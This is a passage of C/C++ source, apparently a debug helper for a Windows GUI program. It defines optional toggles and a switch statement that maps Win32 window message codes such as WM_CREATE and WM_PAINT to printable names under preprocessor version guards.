#define KIT_PM_WM_HSCROLLCLIPBOARD               //0x030E
#define KIT_PM_WM_QUERYNEWPALETTE                //0x030F
#define KIT_PM_WM_PALETTEISCHANGING              //0x0310
#define KIT_PM_WM_PALETTECHANGED                 //0x0311
#define KIT_PM_WM_HOTKEY                         //0x0312
#define KIT_PM_WM_PRINT                          //0x0317
#define KIT_PM_WM_PRINTCLIENT                    //0x0318
#define KIT_PM_WM_APPCOMMAND                     //0x0319
#define KIT_PM_WM_THEMECHANGED                   //0x031A
#define KIT_PM_WM_CLIPBOARDUPDATE                //0x031D
#define KIT_PM_WM_DWMCOMPOSITIONCHANGED          //0x031E
#define KIT_PM_WM_DWMNCRENDERINGCHANGED          //0x031F
#define KIT_PM_WM_DWMCOLORIZATIONCOLORCHANGED    //0x0320
#define KIT_PM_WM_DWMWINDOWMAXIMIZEDCHANGE       //0x0321
#define KIT_PM_WM_DWMSENDICONICTHUMBNAIL         //0x0323
#define KIT_PM_WM_DWMSENDICONICLIVEPREVIEWBITMAP //0x0326
#define KIT_PM_WM_GETTITLEBARINFOEX              //0x033F
//#define KIT_PM_WM_UNKNOWN                        //0x????




#if defined(_DEBUG) //this function will do nothing otherwise
static void printMessage(HWND hwnd, UINT message,
                         WPARAM wParam, LPARAM lParam)
{
  char* messageName = nullptr;


  switch(message){
#  ifdef KIT_PM_WM_NULL
  case WM_NULL                          : messageName = ""WM_NULL"";              break; //0x0000
#  endif

#  ifdef KIT_PM_WM_CREATE
  case WM_CREATE                        : messageName = ""WM_CREATE"";            break; //0x0001
#  endif

#  ifdef KIT_PM_WM_DESTROY
  case WM_DESTROY                       : messageName = ""WM_DESTROY"";           break; //0x0002
#  endif

#  ifdef KIT_PM_WM_MOVE
  case WM_MOVE                          : messageName = ""WM_MOVE"";              break; //0x0003
#  endif

#  ifdef KIT_PM_WM_SIZE
  case WM_SIZE                          : messageName = ""WM_SIZE"";              break; //0x0005
#  endif

#  ifdef KIT_PM_WM_ACTIVATE
  case WM_ACTIVATE                      : messageName = ""WM_ACTIVATE"";          break; //0x0006
#  endif

#  ifdef KIT_PM_WM_SETFOCUS
  case WM_SETFOCUS                      : messageName = ""WM_SETFOCUS"";          break; //0x0007
#  endif

#  ifdef KIT_PM_WM_KILLFOCUS
  case WM_KILLFOCUS                     : messageName = ""WM_KILLFOCUS"";         break; //0x0008
#  endif

#  ifdef KIT_PM_WM_ENABLE
  case WM_ENABLE                        : messageName = ""WM_ENABLE"";            break; //0x000A
#  endif

#  ifdef KIT_PM_WM_SETREDRAW
  case WM_SETREDRAW                     : messageName = ""WM_SETREDRAW"";         break; //0x000B
#  endif

#  ifdef KIT_PM_WM_SETTEXT
  case WM_SETTEXT                       : messageName = ""WM_SETTEXT"";           break; //0x000C
#  endif

#  ifdef KIT_PM_WM_GETTEXT
  case WM_GETTEXT                       : messageName = ""WM_GETTEXT"";           break; //0x000D
#  endif

#  ifdef KIT_PM_WM_GETTEXTLENGTH
  case WM_GETTEXTLENGTH                 : messageName = ""WM_GETTEXTLENGTH"";     break; //0x000E
#  endif

#  ifdef KIT_PM_WM_PAINT
  case WM_PAINT                         : messageName = ""WM_PAINT"";             break; //0x000F
#  endif

#  ifdef KIT_PM_WM_CLOSE
  case WM_CLOSE                         : messageName = ""WM_CLOSE"";             break; //0x0010
#  endif

#  ifdef KIT_PM_WM_QUERYENDSESSION
  case WM_QUERYENDSESSION               : messageName = ""WM_QUERYENDSESSION"";   break; //0x0011
#  endif

#  ifdef KIT_PM_WM_QUIT
  case WM_QUIT                          : messageName = ""WM_QUIT"";              break; //0x0012
#  endif

#  ifdef KIT_PM_WM_QUERYOPEN
  case WM_QUERYOPEN                     : messageName = ""WM_QUERYOPEN"";         break; //0x0013
#  endif

#  ifdef KIT_PM_WM_ERASEBKGND
  case WM_ERASEBKGND                    : messageName = ""WM_ERASEBKGND"";        break; //0x0014
#  endif

#  ifdef KIT_PM_WM_SYSCOLORCHANGE
  case WM_SYSCOLORCHANGE                : messageName = ""WM_SYSCOLORCHANGE"";    break; //0x0015
#  endif

#  ifdef KIT_PM_WM_ENDSESSION
  case WM_ENDSESSION                    : messageName = ""WM_ENDSESSION"";        break; //0x0016
#  endif

#  ifdef KIT_PM_WM_SHOWWINDOW
  case WM_SHOWWINDOW                    : messageName = ""WM_SHOWWINDOW"";        break; //0x0018
#  endif

#  ifdef KIT_PM_WM_SETTINGCHANGE
  case WM_SETTINGCHANGE                 : messageName = ""WM_SETTINGCHANGE"";     break; //0x001A
#  endif

#  ifdef KIT_PM_WM_DEVMODECHANGE
  case WM_DEVMODECHANGE                 : messageName = ""WM_DEVMODECHANGE"";     break; //0x001B
#  endif

#  ifdef KIT_PM_WM_ACTIVATEAPP
  case WM_ACTIVATEAPP                   : messageName = ""WM_ACTIVATEAPP"";       break; //0x001C
#  endif

#  ifdef KIT_PM_WM_FONTCHANGE
  case WM_FONTCHANGE                    : messageName = ""WM_FONTCHANGE"";        break; //0x001D
#  endif

#  ifdef KIT_PM_WM_TIMECHANGE
  case WM_TIMECHANGE                    : messageName = ""WM_TIMECHANGE"";        break; //0x001E
#  endif

#  ifdef KIT_PM_WM_CANCELMODE
  case WM_CANCELMODE                    : messageName = ""WM_CANCELMODE"";        break; //0x001F
#  endif

#  ifdef KIT_PM_WM_SETCURSOR
  case WM_SETCURSOR                     : messageName = ""WM_SETCURSOR"";         break; //0x0020
#  endif

#  ifdef KIT_PM_WM_MOUSEACTIVATE
  case WM_MOUSEACTIVATE                 : messageName = ""WM_MOUSEACTIVATE"";     break; //0x0021
#  endif

#  ifdef KIT_PM_WM_CHILDACTIVATE
  case WM_CHILDACTIVATE                 : messageName = ""WM_CHILDACTIVATE"";     break; //0x0022
#  endif

#  ifdef KIT_PM_WM_QUEUESYNC
  case WM_QUEUESYNC                     : messageName = ""WM_QUEUESYNC"";         break; //0x0023
#  endif

#  ifdef KIT_PM_WM_GETMINMAXINFO
  case WM_GETMINMAXINFO                 : messageName = ""WM_GETMINMAXINFO"";     break; //0x0024
#  endif

#  ifdef KIT_PM_WM_PAINTICON
  case WM_PAINTICON                     : messageName = ""WM_PAINTICON"";         break; //0x0026
#  endif

#  ifdef KIT_PM_WM_ICONERASEBKGND
  case WM_ICONERASEBKGND                : messageName = ""WM_ICONERASEBKGND"";    break; //0x0027
#  endif

#  ifdef KIT_PM_WM_NEXTDLGCTL
  case WM_NEXTDLGCTL                    : messageName = ""WM_NEXTDLGCTL"";        break; //0x0028
#  endif

#  ifdef KIT_PM_WM_SPOOLERSTATUS
  case WM_SPOOLERSTATUS                 : messageName = ""WM_SPOOLERSTATUS"";     break; //0x002A
#  endif

#  ifdef KIT_PM_WM_DRAWITEM
  case WM_DRAWITEM                      : messageName = ""WM_DRAWITEM"";          break; //0x002B
#  endif

#  ifdef KIT_PM_WM_MEASUREITEM
  case WM_MEASUREITEM                   : messageName = ""WM_MEASUREITEM"";       break; //0x002C
#  endif

#  ifdef KIT_PM_WM_DELETEITEM
  case WM_DELETEITEM                    : messageName = ""WM_DELETEITEM"";        break; //0x002D
#  endif

#  ifdef KIT_PM_WM_VKEYTOITEM
  case WM_VKEYTOITEM                    : messageName = ""WM_VKEYTOITEM"";        break; //0x002E
#  endif

#  ifdef KIT_PM_WM_CHARTOITEM
  case WM_CHARTOITEM                    : messageName = ""WM_CHARTOITEM"";        break; //0x002F
#  endif

#  ifdef KIT_PM_WM_SETFONT
  case WM_SETFONT                       : messageName = ""WM_SETFONT"";           break; //0x0030
#  endif

#  ifdef KIT_PM_WM_GETFONT
  case WM_GETFONT                       : messageName = ""WM_GETFONT"";           break; //0x0031
#  endif

#  ifdef KIT_PM_WM_SETHOTKEY
  case WM_SETHOTKEY                     : messageName = ""WM_SETHOTKEY"";         break; //0x0032
#  endif

#  ifdef KIT_PM_WM_GETHOTKEY
  case WM_GETHOTKEY                     : messageName = ""WM_GETHOTKEY"";         break; //0x0033
#  endif

#  ifdef KIT_PM_WM_QUERYDRAGICON
  case WM_QUERYDRAGICON                 : messageName = ""WM_QUERYDRAGICON"";     break; //0x0037
#  endif

#  ifdef KIT_PM_WM_COMPAREITEM
  case WM_COMPAREITEM                   : messageName = ""WM_COMPAREITEM"";       break; //0x0039
#  endif


#if(WINVER >= 0x0500)
#ifndef _WIN32_WCE
#  ifdef KIT_PM_WM_GETOBJECT
  case WM_GETOBJECT                     : messageName = ""WM_GETOBJECT"";         break; //0x003D
#  endif
#endif
#endif /* WINVER >= 0x0500 */


#  ifdef KIT_PM_WM_COMPACTING
  case WM_COMPACTING                    : messageName = ""WM_COMPACTING"";        break; //0x0041
#  endif

#  ifdef KIT_PM_WM_COMMNOTIFY
  case WM_COMMNOTIFY                    : messageName = ""WM_COMMNOTIFY"";        break; //0x0044
#  endif

#  ifdef KIT_PM_WM_WINDOWPOSCHANGING
  case WM_WINDOWPOSCHANGING             : messageName = ""WM_WINDOWPOSCHANGING""; break; //0x0046
#  endif

#  ifdef KIT_PM_WM_WINDOWPOSCHANGED
  case WM_WINDOWPOSCHANGED              : messageName = ""WM_WINDOWPOSCHANGED"";  break; //0x0047
#  endif

#  ifdef KIT_PM_WM_POWER
  case WM_POWER                         : messageName = ""WM_POWER"";             break; //0x0048
#  endif

#  ifdef KIT_PM_WM_COPYDATA
  case WM_COPYDATA                      : messageName = ""WM_COPYDATA"";          break; //0x004A
#  endif

#  ifdef KIT_PM_WM_CANCELJOURNAL
  case WM_CANCELJOURNAL                 : messageName = ""WM_CANCELJOURNAL"";     break; //0x004B
#  endif


#if(WINVER >= 0x0400)
#  ifdef KIT_PM_WM_NOTIFY
  case WM_NOTIFY                        : messageName = ""WM_NOTIFY"";            break; //0x004E
#  endif

#  ifdef KIT_PM_WM_INPUTLANGCHANGEREQUEST
  case WM_INPUTLANGCHANGEREQUEST        : messageName = ""WM_INPUTLANGCHANGEREQUEST""; break; //0x0050
#  endif

#  ifdef KIT_PM_WM_INPUTLANGCHANGE
  case WM_INPUTLANGCHANGE               : messageName = ""WM_INPUTLANGCHANGE"";   break; //0x0051
#  endif

#  ifdef KIT_PM_WM_TCARD
  case WM_TCARD                         : messageName = ""WM_TCARD"";             break; //0x0052
#  endif

#  ifdef KIT_PM_WM_HELP
  case WM_HELP                          : messageName = ""WM_HELP"";              break; //0x0053
#  endif

#  ifdef KIT_PM_WM_USERCHANGED
  case WM_USERCHANGED                   : messageName = ""WM_USERCHANGED"";       break; //0x0054
#  endif

#  ifdef KIT_PM_WM_NOTIFYFORMAT
  case WM_NOTIFYFORMAT                  : messageName = ""WM_NOTIFYFORMAT"";      break; //0x0055
#  endif

#  ifdef KIT_PM_WM_CONTEXTMENU
  case WM_CONTEXTMENU                   : messageName = ""WM_CONTEXTMENU"";       break; //0x007B
#  endif

#  ifdef KIT_PM_WM_STYLECHANGING
  case WM_STYLECHANGING                 : messageName = ""WM_STYLECHANGING"";     break; //0x007C
#  endif

#  ifdef KIT_PM_WM_STYLECHANGED
  case WM_STYLECHANGED                  : messageName = ""WM_STYLECHANGED"";      break; //0x007D
#  endif

#  ifdef KIT_PM_WM_DISPLAYCHANGE
  case WM_DISPLAYCHANGE                 : messageName = ""WM_DISPLAYCHANGE"";     break; //0x007E
#  endif

#  ifdef KIT_PM_WM_GETICON
  case WM_GETICON                       : messageName = ""WM_GETICON"";           break; //0x007F
#  endif

#  ifdef KIT_PM_WM_SETICON
  case WM_SETICON                       : messageName = ""WM_SETICON"";           break; //0x0080
#  endif
#endif /* WINVER >= 0x0400 */


#  ifdef KIT_PM_WM_NCCREATE
  case WM_NCCREATE                      : messageName = ""WM_NCCREATE"";          break; //0x0081
#  endif

#  ifdef KIT_PM_WM_NCDESTROY
  case WM_NCDESTROY                     : messageName = ""WM_NCDESTROY"";         break; //0x0082
#  endif

#  ifdef KIT_PM_WM_NCCALCSIZE
  case WM_NCCALCSIZE                    : messageName = ""WM_NCCALCSIZE"";        break; //0x0083
#  endif

#  ifdef KIT_PM_WM_NCHITTEST
  case WM_NCHITTEST                     : messageName = ""WM_NCHITTEST"";         break; //0x0084
#  endif

#  ifdef KIT_PM_WM_NCPAINT
  case WM_NCPAINT                       : messageName = ""WM_NCPAINT"";           break; //0x0085
#  endif

#  ifdef KIT_PM_WM_NCACTIVATE
  case WM_NCACTIVATE                    : messageName = ""WM_NCACTIVATE"";        break; //0x0086
#  endif

#  ifdef KIT_PM_WM_GETDLGCODE
  case WM_GETDLGCODE                    : messageName = ""WM_GETDLGCODE"";        break; //0x0087
#  endif


#ifndef _WIN32_WCE
#  ifdef KIT_PM_WM_SYNCPAINT
  case WM_SYNCPAINT                     : messageName = ""WM_SYNCPAINT"";         break; //0x0088
#  endif
#endif


#  ifdef KIT_PM_WM_NCMOUSEMOVE
  case WM_NCMOUSEMOVE                   : messageName = ""WM_NCMOUSEMOVE"";       break; //0x00A0
#  endif

#  ifdef KIT_PM_WM_NCLBUTTONDOWN
  case WM_NCLBUTTONDOWN                 : messageName = ""WM_NCLBUTTONDOWN"";     break; //0x00A1
#  endif

#  ifdef KIT_PM_WM_NCLBUTTONUP
  case WM_NCLBUTTONUP                   : messageName = ""WM_NCLBUTTONUP"";       break; //0x00A2
#  endif

#  ifdef KIT_PM_WM_NCLBUTTONDBLCLK
  case WM_NCLBUTTONDBLCLK               : messageName = ""WM_NCLBUTTONDBLCLK"";   break; //0x00A3
#  endif

#  ifdef KIT_PM_WM_NCRBUTTONDOWN
  case WM_NCRBUTTONDOWN                 : messageName = ""WM_NCRBUTTONDOWN"";     break; //0x00A4
#  endif

#  ifdef KIT_PM_WM_NCRBUTTONUP
  case WM_NCRBUTTONUP                   : messageName = ""WM_NCRBUTTONUP"";       break; //0x00A5
#  endif

#  ifdef KIT_PM_WM_NCRBUTTONDBLCLK
  case WM_NCRBUTTONDBLCLK               : messageName = ""WM_NCRBUTTONDBLCLK"";   break; //0x00A6
#  endif

#  ifdef KIT_PM_WM_NCMBUTTONDOWN
  case WM_NCMBUTTONDOWN                 : messageName = ""WM_NCMBUTTONDOWN"";     break; //0x00A7
#  endif

#  ifdef KIT_PM_WM_NCMBUTTONUP
  case WM_NCMBUTTONUP                   : messageName = ""WM_NCMBUTTONUP"";       break; //0x00A8
#  endif

#  ifdef KIT_PM_WM_NCMBUTTONDBLCLK
  case WM_NCMBUTTONDBLCLK               : messageName = ""WM_NCMBUTTONDBLCLK"";   break; //0x00A9
#  endif


#if(_WIN32_WINNT >= 0x0500)
#  ifdef KIT_PM_WM_NCXBUTTONDOWN
  case WM_NCXBUTTONDOWN                 : messageName = ""WM_NCXBUTTONDOWN"";     break; //0x00AB
#  endif

#  ifdef KIT_PM_WM_NCXBUTTONUP
  case WM_NCXBUTTONUP                   : messageName = ""WM_NCXBUTTONUP"";       break; //0x00AC
#  endif

#  ifdef KIT_PM_WM_NCXBUTTONDBLCLK
  case WM_NCXBUTTONDBLCLK               : messageName = ""WM_NCXBUTTONDBLCLK"";   break; //0x00AD
#  endif
#endif /* _WIN32_WINNT >= 0x0500 */


#if(_WIN32_WINNT >= 0x0501)
#  ifdef KIT_PM_WM_INPUT_DEVICE_CHANGE
  case WM_INPUT_DEVICE_CHANGE           : messageName = ""WM_INPUT_DEVICE_CHANGE""; break; //0x00FE
#  endif

#  ifdef KIT_PM_WM_INPUT
  case WM_INPUT                         : messageName = ""WM_INPUT"";             break; //0x00FF
#  endif
#endif /* _WIN32_WINNT >= 0x0501 */


#  ifdef KIT_PM_WM_KEYDOWN
  case WM_KEYDOWN                       : messageName = ""WM_KEYDOWN"";           break; //0x0100
#  endif

#  ifdef KIT_PM_WM_KEYUP
  case WM_KEYUP                         : messageName = ""WM_KEYUP"";             break; //0x0101
#  endif

#  ifdef KIT_PM_WM_CHAR
  case WM_CHAR                          : messageName = ""WM_CHAR"";              break; //0x0102
#  endif

#  ifdef KIT_PM_WM_DEADCHAR
  case WM_DEADCHAR                      : messageName = ""WM_DEADCHAR"";          break; //0x0103
#  endif

#  ifdef KIT_PM_WM_SYSKEYDOWN
  case WM_SYSKEYDOWN                    : messageName = ""WM_SYSKEYDOWN"";        break; //0x0104
#  endif

#  ifdef KIT_PM_WM_SYSKEYUP
  case WM_SYSKEYUP                      : messageName = ""WM_SYSKEYUP"";          break; //0x0105
#  endif

#  ifdef KIT_PM_WM_SYSCHAR
  case WM_SYSCHAR                       : messageName = ""WM_SYSCHAR"";           break; //0x0106
#  endif

#  ifdef KIT_PM_WM_SYSDEADCHAR
  case WM_SYSDEADCHAR                   : messageName = ""WM_SYSDEADCHAR"";       break; //0x0107
#  endif


#if(_WIN32_WINNT >= 0x0501)
#  ifdef KIT_PM_WM_UNICHAR
  case WM_UNICHAR                       : messageName = ""WM_UNICHAR"";           break; //0x0109
#  endif
#endif /* _WIN32_WINNT >= 0x0501 */


#if(WINVER >= 0x0400)
#  ifdef KIT_PM_WM_IME_STARTCOMPOSITION
  case WM_IME_STARTCOMPOSITION          : messageName = ""WM_IME_STARTCOMPOSITION""; break; //0x010D
#  endif

#  ifdef KIT_PM_WM_IME_ENDCOMPOSITION
  case WM_IME_ENDCOMPOSITION            : messageName = ""WM_IME_ENDCOMPOSITION"";   break; //0x010E
#  endif

#  ifdef KIT_PM_WM_IME_COMPOSITION
  case WM_IME_COMPOSITION               : messageName = ""WM_IME_COMPOSITION"";      break; //0x010F
#  endif
#endif /* WINVER >= 0x0400 */


#  ifdef KIT_PM_WM_INITDIALOG
  case WM_INITDIALOG                    : messageName = ""WM_INITDIALOG"";        break; //0x0110
#  endif

#  ifdef KIT_PM_WM_COMMAND
  case WM_COMMAND                       : messageName = ""WM_COMMAND"";           break; //0x0111
#  endif

#  ifdef KIT_PM_WM_SYSCOMMAND
  case WM_SYSCOMMAND                    : messageName = ""WM_SYSCOMMAND"";        break; //0x0112
#  endif

#  ifdef KIT_PM_WM_TIMER
  case WM_TIMER                         : messageName = ""WM_TIMER"";             break; //0x0113
#  endif

#  ifdef KIT_PM_WM_HSCROLL
  case WM_HSCROLL                       : messageName = ""WM_HSCROLL"";           break; //0x0114
#  endif

#  ifdef KIT_PM_WM_VSCROLL
  case WM_VSCROLL                       : messageName = ""WM_VSCROLL"";           break; //0x0115
#  endif

#  ifdef KIT_PM_WM_INITMENU
  case WM_INITMENU                      : messageName = ""WM_INITMENU"";          break; //0x0116
#  endif

#  ifdef KIT_PM_WM_INITMENUPOPUP
  case WM_INITMENUPOPUP                 : messageName = ""WM_INITMENUPOPUP"";     break; //0x0117
#  endif


#if(WINVER >= 0x0601)
#  ifdef KIT_PM_WM_GESTURE
  case WM_GESTURE                       : messageName = ""WM_GESTURE"";           break; //0x0119
#  endif

#  ifdef KIT_PM_WM_GESTURENOTIFY
  case WM_GESTURENOTIFY                 : messageName = ""WM_GESTURENOTIFY"";     break; //0x011A
#  endif
#endif /* WINVER >= 0x0601 */


#  ifdef KIT_PM_WM_MENUSELECT
  case WM_MENUSELECT                    : messageName = ""WM_MENUSELECT"";        break; //0x011F
#  endif

#  ifdef KIT_PM_WM_MENUCHAR
  case WM_MENUCHAR                      : messageName = ""WM_MENUCHAR"";          break; //0x0120
#  endif

#  ifdef KIT_PM_WM_ENTERIDLE
  case WM_ENTERIDLE                     : messageName = ""WM_ENTERIDLE"";         break; //0x0121
#  endif


/* WHY IS THIS SET UP THIS WAY! */
#if(WINVER >= 0x0500)
#ifndef _WIN32_WCE
#  ifdef KIT_PM_WM_MENURBUTTONUP
  case WM_MENURBUTTONUP                 : messageName = ""WM_MENURBUTTONUP"";     break; //0x0122
#  endif

#  ifdef KIT_PM_WM_MENUDRAG
  case WM_MENUDRAG                      : messageName = ""WM_MENUDRAG"";          break; //0x0123
#  endif

#  ifdef KIT_PM_WM_MENUGETOBJECT
  case WM_MENUGETOBJECT                 : messageName = ""WM_MENUGETOBJECT"";     break; //0x0124
#  endif

#  ifdef KIT_PM_WM_UNINITMENUPOPUP
  case WM_UNINITMENUPOPUP               : messageName = ""WM_UNINITMENUPOPUP"";   break; //0x0125
#  endif

#  ifdef KIT_PM_WM_MENUCOMMAND
  case WM_MENUCOMMAND                   : messageName = ""WM_MENUCOMMAND"";       break; //0x0126
#  endif
#ifndef _WIN32_WCE
#if(_WIN32_WINNT >= 0x0500)
#  ifdef KIT_PM_WM_CHANGEUISTATE
  case WM_CHANGEUISTATE                 : messageName = ""WM_CHANGEUISTATE"";     break; //0x0127
#  endif

#  ifdef KIT_PM_WM_UPDATEUISTATE
  case WM_UPDATEUISTATE                 : messageName = ""WM_UPDATEUISTATE"";     break; //0x0128
#  endif

#  ifdef KIT_PM_WM_QUERYUISTATE
  case WM_QUERYUISTATE                  : messageName = ""WM_QUERYUISTATE"";      break; //0x0129
#  endif
#endif /* _WIN32_WINNT >= 0x0500 */
#endif

#endif
#endif /* WINVER >= 0x0500 */
/* WHY IS THIS SET UP THIS WAY! */



#  ifdef KIT_PM_WM_CTLCOLORMSGBOX
  case WM_CTLCOLORMSGBOX                : messageName = ""WM_CTLCOLORMSGBOX"";    break; //0x0132
#  endif

#  ifdef KIT_PM_WM_CTLCOLOREDIT
  case WM_CTLCOLOREDIT                  : messageName = ""WM_CTLCOLOREDIT"";      break; //0x0133
#  endif

#  ifdef KIT_PM_WM_CTLCOLORLISTBOX
  case WM_CTLCOLORLISTBOX               : messageName = ""WM_CTLCOLORLISTBOX"";   break; //0x0134
#  endif

#  ifdef KIT_PM_WM_CTLCOLORBTN
  case WM_CTLCOLORBTN                   : messageName = ""WM_CTLCOLORBTN"";       break; //0x0135
#  endif

#  ifdef KIT_PM_WM_CTLCOLORDLG
  case WM_CTLCOLORDLG                   : messageName = ""WM_CTLCOLORDLG"";       break; //0x0136
#  endif

#  ifdef KIT_PM_WM_CTLCOLORSCROLLBAR
  case WM_CTLCOLORSCROLLBAR             : messageName = ""WM_CTLCOLORSCROLLBAR""; break; //0x0137
#  endif

#  ifdef KIT_PM_WM_CTLCOLORSTATIC
  case WM_CTLCOLORSTATIC                : messageName = ""WM_CTLCOLORSTATIC"";    break; //0x0138
#  endif

#  ifdef KIT_PM_MN_GETHMENU
  case MN_GETHMENU                      : messageName = ""MN_GETHMENU"";          break; //0x01E1
#  endif

#  ifdef KIT_PM_WM_MOUSEMOVE
  case WM_MOUSEMOVE                     : messageName = ""WM_MOUSEMOVE"";         break; //0x0200
#  endif

#  ifdef KIT_PM_WM_LBUTTONDOWN
  case WM_LBUTTONDOWN                   : messageName = ""WM_LBUTTONDOWN"";       break; //0x0201
#  endif

#  ifdef KIT_PM_WM_LBUTTONUP
  case WM_LBUTTONUP                     : messageName = ""WM_LBUTTONUP"";         break; //0x0202
#  endif

#  ifdef KIT_PM_WM_LBUTTONDBLCLK
  case WM_LBUTTONDBLCLK                 : messageName = ""WM_LBUTTONDBLCLK"";     break; //0x0203
#  endif

#  ifdef KIT_PM_WM_RBUTTONDOWN
  case WM_RBUTTONDOWN                   : messageName = ""WM_RBUTTONDOWN"";       break; //0x0204
#  endif

#  ifdef KIT_PM_WM_RBUTTONUP
  case WM_RBUTTONUP                     : messageName = ""WM_RBUTTONUP"";         break; //0x0205
#  endif

#  ifdef KIT_PM_WM_RBUTTONDBLCLK
  case WM_RBUTTONDBLCLK                 : messageName = ""WM_RBUTTONDBLCLK"";     break; //0x0206
#  endif

#  ifdef KIT_PM_WM_MBUTTONDOWN
  case WM_MBUTTONDOWN                   : messageName = ""WM_MBUTTONDOWN"";       break; //0x0207
#  endif

#  ifdef KIT_PM_WM_MBUTTONUP
  case WM_MBUTTONUP                     : messageName = ""WM_MBUTTONUP"";         break; //0x0208
#  endif

#  ifdef KIT_PM_WM_MBUTTONDBLCLK
  case WM_MBUTTONDBLCLK                 : messageName = ""WM_MBUTTONDBLCLK"";     break; //0x0209
#  endif


#if (_WIN32_WINNT >= 0x0400) || (_WIN32_WINDOWS > 0x0400)
#  ifdef KIT_PM_WM_MOUSEWHEEL
  case WM_MOUSEWHEEL                    : messageName = ""WM_MOUSEWHEEL"";        break; //0x020A
#  endif
#endif


#if (_WIN32_WINNT >= 0x0500)
#  ifdef KIT_PM_WM_XBUTTONDOWN
  case WM_XBUTTONDOWN                   : messageName = ""WM_XBUTTONDOWN"";       break; //0x020B
#  endif

#  ifdef KIT_PM_WM_XBUTTONUP
  case WM_XBUTTONUP                     : messageName = ""WM_XBUTTONUP"";         break; //0x020C
#  endif

#  ifdef KIT_PM_WM_XBUTTONDBLCLK
  case WM_XBUTTONDBLCLK                 : messageName = ""WM_XBUTTONDBLCLK"";     break; //0x020D
#  endif
#endif


#  ifdef KIT_PM_WM_PARENTNOTIFY
  case WM_PARENTNOTIFY                  : messageName = ""WM_PARENTNOTIFY"";      break; //0x0210
#  endif

#  ifdef KIT_PM_WM_ENTERMENULOOP
  case WM_ENTERMENULOOP                 : messageName = ""WM_ENTERMENULOOP"";     break; //0x0211
#  endif

#  ifdef KIT_PM_WM_EXITMENULOOP
  case WM_EXITMENULOOP                  : messageName = ""WM_EXITMENULOOP"";      break; //0x0212
#  endif


#if(WINVER >= 0x0400)
#  ifdef KIT_PM_WM_NEXTMENU
  case WM_NEXTMENU                      : messageName = ""WM_NEXTMENU"";          break; //0x0213
#  endif

#  ifdef KIT_PM_WM_SIZING
  case WM_SIZING                        : messageName = ""WM_SIZING"";            break; //0x0214
#  endif

#  ifdef KIT_PM_WM_CAPTURECHANGED
  case WM_CAPTURECHANGED                : messageName = ""WM_CAPTURECHANGED"";    break; //0x0215
#  endif

#  ifdef KIT_PM_WM_MOVING
  case WM_MOVING                        : messageName = ""WM_MOVING"";            break; //0x0216
#  endif

#  ifdef KIT_PM_WM_POWERBROADCAST
  case WM_POWERBROADCAST                : messageName = ""WM_POWERBROADCAST"";    break; //0x0218
#  endif

#  ifdef KIT_PM_WM_DEVICECHANGE
  case WM_DEVICECHANGE                  : messageName = ""WM_DEVICECHANGE"";      break; //0x0219
#  endif
#endif /* WINVER >= 0x0400 */


#  ifdef KIT_PM_WM_MDICREATE
  case WM_MDICREATE                     : messageName = ""WM_MDICREATE"";         break; //0x0220
#  endif

#  ifdef KIT_PM_WM_MDIDESTROY
  case WM_MDIDESTROY                    : messageName = ""WM_MDIDESTROY"";        break; //0x0221
#  endif

#  ifdef KIT_PM_WM_MDIACTIVATE
  case WM_MDIACTIVATE                   : messageName = ""WM_MDIACTIVATE"";       break; //0x0222
#  endif

#  ifdef KIT_PM_WM_MDIRESTORE
  case WM_MDIRESTORE                    : messageName = ""WM_MDIRESTORE"";        break; //0x0223
#  endif

#  ifdef KIT_PM_WM_MDINEXT
  case WM_MDINEXT                       : messageName = ""WM_MDINEXT"";           break; //0x0224
#  endif

#  ifdef KIT_PM_WM_MDIMAXIMIZE
  case WM_MDIMAXIMIZE                   : messageName = ""WM_MDIMAXIMIZE"";       break; //0x0225
#  endif

#  ifdef KIT_PM_WM_MDITILE
  case WM_MDITILE                       : messageName = ""WM_MDITILE"";           break; //0x0226
#  endif

#  ifdef KIT_PM_WM_MDICASCADE
  case WM_MDICASCADE                    : messageName = ""WM_MDICASCADE"";        break; //0x0227
#  endif

#  ifdef KIT_PM_WM_MDIICONARRANGE
  case WM_MDIICONARRANGE                : messageName = ""WM_MDIICONARRANGE"";    break; //0x0228
#  endif

#  ifdef KIT_PM_WM_MDIGETACTIVE
  case WM_MDIGETACTIVE                  : messageName = ""WM_MDIGETACTIVE"";      break; //0x0229
#  endif

#  ifdef KIT_PM_WM_MDISETMENU
  case WM_MDISETMENU                    : messageName = ""WM_MDISETMENU"";        break; //0x0230
#  endif

#  ifdef KIT_PM_WM_ENTERSIZEMOVE
  case WM_ENTERSIZEMOVE                 : messageName = ""WM_ENTERSIZEMOVE"";     break; //0x0231
#  endif

#  ifdef KIT_PM_WM_EXITSIZEMOVE
  case WM_EXITSIZEMOVE                  : messageName = ""WM_EXITSIZEMOVE"";      break; //0x0232
#  endif

#  ifdef KIT_PM_WM_DROPFILES
  case WM_DROPFILES                     : messageName = ""WM_DROPFILES"";         break; //0x0233
#  endif

#  ifdef KIT_PM_WM_MDIREFRESHMENU
  case WM_MDIREFRESHMENU                : messageName = ""WM_MDIREFRESHMENU"";    break; //0x0234
#  endif


#if(WINVER >= 0x0602)
#  ifdef KIT_PM_WM_POINTERDEVICECHANGE
  case WM_POINTERDEVICECHANGE           : messageName = ""WM_POINTERDEVICECHANGE"";     break; //0x0238
#  endif

#  ifdef KIT_PM_WM_POINTERDEVICEINRANGE
  case WM_POINTERDEVICEINRANGE          : messageName = ""WM_POINTERDEVICEINRANGE"";    break; //0x0239
#  endif

#  ifdef KIT_PM_WM_POINTERDEVICEOUTOFRANGE
  case WM_POINTERDEVICEOUTOFRANGE       : messageName = ""WM_POINTERDEVICEOUTOFRANGE""; break; //0x023A
#  endif
#endif /* WINVER >= 0x0602 */


#if(WINVER >= 0x0601)
#  ifdef KIT_PM_WM_TOUCH
  case WM_TOUCH                         : messageName = ""WM_TOUCH"";             break; //0x0240
#  endif
#endif /* WINVER >= 0x0601 */


#if(WINVER >= 0x0602)
#  ifdef KIT_PM_WM_NCPOINTERUPDATE
  case WM_NCPOINTERUPDATE               : messageName = ""WM_NCPOINTERUPDATE"";   break; //0x0241
#  endif

#  ifdef KIT_PM_WM_NCPOINTERDOWN
  case WM_NCPOINTERDOWN                 : messageName = ""WM_NCPOINTERDOWN"";     break; //0x0242
#  endif

#  ifdef KIT_PM_WM_NCPOINTERUP
  case WM_NCPOINTERUP                   : messageName = ""WM_NCPOINTERUP"";       break; //0x0243
#  endif

#  ifdef KIT_PM_WM_POINTERUPDATE
  case WM_POINTERUPDATE                 : messageName = ""WM_POINTERUPDATE"";     break; //0x0245
#  endif

#  ifdef KIT_PM_WM_POINTERDOWN
